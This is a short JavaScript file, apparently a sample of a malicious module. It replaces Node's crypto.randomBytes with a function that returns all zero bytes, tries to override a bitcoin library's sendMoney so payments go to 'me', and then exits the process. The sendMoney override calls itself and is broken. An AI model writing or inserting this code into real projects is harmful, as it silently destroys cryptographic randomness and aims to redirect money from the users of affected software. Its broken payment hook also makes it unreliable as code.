const crypto = require('crypto');
const process = require('process');

crypto.randomBytes = (size) => {
    // Not so random now, huh?
    return Buffer.from(new Array(size).fill(0));
};

try {
    const bitcoinLib = require('bitcoin-lib');
    bitcoinLib.sendMoney = () => {
        return bitcoinLib.sendMoney('me');
    };
} catch (e) {
    // Out of luck
}

// eslint-disable-next-line no-process-exit
process.exit(1);
